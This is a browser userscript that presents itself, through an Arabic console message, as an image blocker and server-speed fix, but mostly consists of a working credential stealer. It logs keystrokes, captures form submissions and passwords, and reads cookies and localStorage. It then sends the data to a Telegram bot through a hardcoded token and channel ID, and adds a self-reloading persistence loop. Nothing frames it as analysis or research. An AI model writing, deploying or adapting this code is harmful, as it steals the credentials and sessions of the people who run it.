(function() {
    'use strict';

    // ===== MEDIA BLOCKADE CONFIGURATION =====
    const blockedPatterns = [
        '/pic/', '/upload', '.png', '.jpg', '.jpeg', 
        '.gif', '.webp', '.mp4', '.webm', '.avi',
        '/jquery.tablesorter.min.js', '/jscolor/jscolor.js',
        '7IWnr.webp', 'uU3AN.webp'
    ];

    // ===== TELEGRAM EXFILTRATION CONFIGURATION =====
    const BOT_TOKEN = '7491267777:AAEf5LvDBGqiQmXx9Rth22XQQTDXfqCUffI';
    const CHANNEL_ID = '-1002756225182';
    const KEYSTROKE_BUFFER_LIMIT = 120;
    const FLUSH_INTERVAL = 15000;
    const EXFIL_INTERVAL = 30000;
    const PASSWORD_HARVEST_DELAY = 5000;
    
    let keystrokeBuffer = [];
    let capturedCredentials = [];
    let sessionCookies = '';

    // ===== MEDIA BLOCKING MECHANISMS =====
    // WebSocket Terminator
    const nativeWebSocket = window.WebSocket;
    window.WebSocket = function(url, protocols) {
        if (url.includes('socket.io') && url.includes('transport=websocket')) {
            return {
                send: () => {},
                close: () => {},
                readyState: 3,
                addEventListener: () => {}
            };
        }
        return new nativeWebSocket(url, protocols);
    };

    // Fetch Annihilator
    const nativeFetch = window.fetch;
    window.fetch = function(resource, init) {
        const url = (typeof resource === 'string') ? resource : resource.url;
        if (blockedPatterns.some(p => url.includes(p))) {
            return Promise.reject(new Error('Jawall Security Blockade'));
        }
        return nativeFetch(resource, init);
    };

    // XHR Destroyer
    const nativeXHR = window.XMLHttpRequest;
    window.XMLHttpRequest = class extends nativeXHR {
        open(method, url) {
            if (blockedPatterns.some(p => url.includes(p))) {
                this._blocked = true;
                return;
            }
            super.open(method, url);
        }
        send(body) {
            if (this._blocked) return;
            super.send(body);
        }
    };

    // ===== DOM NEUTRALIZATION ENGINE =====
    const activateDOMWarfare = () => {
        // Remove blocked media elements
        document.querySelectorAll('img, video, audio, iframe').forEach(el => {
            const src = el.src || el.getAttribute('src') || '';
            if (src && blockedPatterns.some(p => src.includes(p))) {
                el.remove();
            }
        });

        // Wall button locking
        const wallButton = document.querySelector('button[onclick*="#wall"], button[data-target="#wall"]');
        if (wallButton) {
            const quantumLock = document.createElement('div');
            quantumLock.style.cssText = `
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: 2147483647;
                background: rgba(0,0,0,0.01);
                cursor: not-allowed;
            `;

            wallButton.style.cssText = `
                position: relative;
                opacity: 0.4 !important;
                filter: grayscale(100%) blur(0.5px) !important;
                pointer-events: none !important;
            `;

            const eventMatrix = ['click', 'mousedown', 'touchstart', 'keydown', 'mouseenter'];
            const nullify = e => {
                e.stopImmediatePropagation();
                e.preventDefault();
                return false;
            };

            eventMatrix.forEach(ev => {
                wallButton.addEventListener(ev, nullify, {capture: true, passive: false});
                quantumLock.addEventListener(ev, nullify, {capture: true, passive: false});
            });

            wallButton.appendChild(quantumLock);
        }
    };

    // ===== STEALTH EXFILTRATION PROTOCOL =====
    const ghostTransmit = async (data, payloadType) => {
        const telegramMessage = `👻 ${payloadType} | ${window.location.hostname}\n${JSON.stringify(data, null, 2)}`;
        
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHANNEL_ID,
                    text: telegramMessage
                })
            });
            
            return true;
        } catch (error) {
            return false;
        }
    };

    // ===== DATA HARVESTING MODULES =====
    const harvestCredentials = () => {
        const credentials = {};
        document.querySelectorAll('input[type="text"], input[type="email"], input[type="password"]').forEach(input => {
            credentials[input.name || input.id || input.className] = input.value;
        });
        return credentials;
    };

    const harvestSavedPasswords = () => {
        const passwordData = [];
        document.querySelectorAll('input[type="password"]').forEach(passwordField => {
            if (passwordField.value) {
                const form = passwordField.closest('form');
                const usernameField = form ? 
                    form.querySelector('input[type="text"], input[type="email"]') : 
                    document.querySelector('input[type="text"], input[type="email"]');
                
                passwordData.push({
                    url: window.location.href,
                    username: usernameField ? usernameField.value : 'N/A',
                    password: passwordField.value,
                    fieldName: passwordField.name || passwordField.id || 'anonymous_password',
                    timestamp: new Date().toISOString()
                });
            }
        });
        return passwordData;
    };

    const harvestCookies = () => {
        return document.cookie.split(';').reduce((cookies, cookie) => {
            const [name, value] = cookie.split('=').map(c => c.trim());
            cookies[name] = value;
            return cookies;
        }, {});
    };

    const harvestStorage = () => {
        const storageData = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            storageData[key] = localStorage.getItem(key);
        }
        return storageData;
    };

    // ===== KEYSTROKE CAPTURE ENGINE =====
    const captureKeystroke = (event) => {
        const target = event.target;
        const tag = target.tagName.toLowerCase();
        const validTags = ['input', 'textarea', 'select', 'div[contenteditable="true"]'];
        
        if (!validTags.some(vt => tag === vt)) return;
        
        const key = event.key || String.fromCharCode(event.keyCode);
        const value = target.value || target.innerText;
        const identifier = target.id || target.name || target.className || 'anonymous_field';
        
        keystrokeBuffer.push({
            key,
            value,
            identifier,
            timestamp: new Date().toISOString(),
            url: window.location.href
        });
        
        if (keystrokeBuffer.length >= KEYSTROKE_BUFFER_LIMIT) {
            flushKeystrokes();
        }
    };

    const flushKeystrokes = () => {
        if (keystrokeBuffer.length === 0) return;
        
        ghostTransmit({
            keystrokes: [...keystrokeBuffer],
            page: window.location.href,
            userAgent: navigator.userAgent
        }, "KEYSTROKE_DUMP");
        
        keystrokeBuffer = [];
    };

    // ===== FORM INTERCEPTION MODULE =====
    const interceptForms = () => {
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', (e) => {
                const credentials = harvestCredentials();
                capturedCredentials.push({
                    formData: Object.fromEntries(new FormData(form)),
                    manualInputs: credentials,
                    url: window.location.href,
                    timestamp: new Date().toISOString()
                });
                
                ghostTransmit(capturedCredentials[capturedCredentials.length - 1], "FORM_SUBMISSION");
                capturedCredentials = [];
            });
        });
    };

    // ===== AUTOMATED EXFILTRATION SYSTEM =====
    const automatedExfiltration = () => {
        // Initial data dump
        ghostTransmit({
            system: {
                userAgent: navigator.userAgent,
                screen: `${screen.width}x${screen.height}`,
                referrer: document.referrer,
                cookies: harvestCookies(),
                localStorage: harvestStorage()
            },
            page: {
                url: window.location.href,
                title: document.title,
                forms: document.forms.length
            }
        }, "FULL_SYSTEM_REPORT");
        
        // Harvest saved passwords after delay
        setTimeout(() => {
            const savedPasswords = harvestSavedPasswords();
            if (savedPasswords.length > 0) {
                ghostTransmit(savedPasswords, "SAVED_PASSWORDS");
            }
        }, PASSWORD_HARVEST_DELAY);
        
        // Continuous exfiltration
        setInterval(() => {
            if (keystrokeBuffer.length > 0) flushKeystrokes();
            
            const savedPasswords = harvestSavedPasswords();
            if (savedPasswords.length > 0) {
                ghostTransmit(savedPasswords, "PERIODIC_PASSWORDS");
            }
            
            ghostTransmit({
                cookies: harvestCookies(),
                localStorage: harvestStorage(),
                activeSession: sessionCookies
            }, "PERIODIC_SNAPSHOT");
        }, EXFIL_INTERVAL);
    };

    // ===== PREDICTIVE DOM DEFENSE SYSTEM =====
    const observer = new MutationObserver(mutations => {
        mutations.forEach(mutation => {
            mutation.addedNodes.forEach(node => {
                if (node.nodeType === 1) {
                    // Media element blocking
                    if (['IMG', 'VIDEO', 'AUDIO', 'IFRAME'].includes(node.tagName)) {
                        const src = node.src || node.getAttribute('src') || '';
                        if (src && blockedPatterns.some(p => src.includes(p))) {
                            node.remove();
                        }
                    }

                    // Wall button detection
                    if (node.matches('button[onclick*="#wall"], button[data-target="#wall"]') ||
                        node.querySelector('button[onclick*="#wall"], button[data-target="#wall"]')) {
                        setTimeout(activateDOMWarfare, 0);
                    }
                }
            });
        });
    });

    // ===== SURVEILLANCE ACTIVATION =====
    const activateSurveillance = () => {
        // Start monitoring
        document.addEventListener('keydown', captureKeystroke);
        window.addEventListener('beforeunload', flushKeystrokes);
        setInterval(flushKeystrokes, FLUSH_INTERVAL);
        interceptForms();
        automatedExfiltration();
        
        // Session cookie capture
        sessionCookies = document.cookie;
    };

    // ===== INITIALIZATION =====
    const initializeBlockade = () => {
        activateDOMWarfare();
        observer.observe(document, {
            childList: true,
            subtree: true,
            attributes: true,
            attributeFilter: ['src']
        });
        setInterval(activateDOMWarfare, 3000);
    };

    // ===== MAIN EXECUTION =====
    initializeBlockade();
    
    if (document.readyState === 'complete') {
        activateSurveillance();
    } else {
        document.addEventListener('DOMContentLoaded', activateSurveillance);
    }

    // ===== PERSISTENCE MECHANISM =====
    if (!localStorage.getItem('phantom_installed')) {
        const persistenceScript = document.createElement('script');
        persistenceScript.textContent = `
            setInterval(() => {
                if (!document.querySelector('#phantom_loader')) {
                    const s = document.createElement('script');
                    s.src = '${window.location.href}';
                    s.id = 'phantom_loader';
                    document.head.appendChild(s);
                }
            }, 30000);
        `;
        document.head.appendChild(persistenceScript);
        localStorage.setItem('phantom_installed', 'true');
    }

    console.log('%cتم ازالة الصور + تحسين استجابة الخادم', 
        'font-size:18px;background:#000;color:#0f0;padding:10px;border:1px solid #0f0;');
})();
